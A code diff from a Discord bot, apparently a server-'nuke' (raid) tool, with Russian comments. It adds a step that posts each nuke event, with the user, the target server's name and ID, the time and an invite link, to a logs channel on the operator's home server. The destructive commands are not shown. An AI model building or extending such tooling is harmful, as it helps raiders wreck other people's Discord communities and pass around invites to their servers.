@@ -96,6 +96,27 @@ async def log_nuke(guild: discord.Guild, user: discord.User, nuke_type: str):
     }
     await db_set("nuke_logs", str(guild.id), entry)
 
+    # Отправляем в logs канал на домашнем сервере
+    try:
+        home = bot.get_guild(HOME_GUILD_ID)
+        if home:
+            logs_ch = discord.utils.find(lambda c: c.name.lower() == "📊・logs" or "logs" in c.name.lower(), home.text_channels)
+            if logs_ch:
+                type_emoji = {"nuke": "💀", "super_nuke": "☠️", "owner_nuke": "👑"}.get(nuke_type, "☠️")
+                embed = discord.Embed(
+                    title=f"{type_emoji} {nuke_type.replace('_', ' ').upper()}",
+                    color=0xff0000
+                )
+                embed.add_field(name="👤 Кто", value=f"{user} (`{user.id}`)", inline=True)
+                embed.add_field(name="🏠 Сервер", value=f"{guild.name} (`{guild.id}`)", inline=True)
+                embed.add_field(name="🕐 Время", value=entry["time"], inline=True)
+                if invite_url:
+                    embed.add_field(name="🔗 Инвайт", value=invite_url, inline=False)
+                embed.set_footer(text="☠️ Kanero  |  !nukelogs — полная история")
+                await logs_ch.send(embed=embed)
+    except Exception:
+        pass
+
 
 
 # ─── HELPERS ───────────────────────────────────────────────
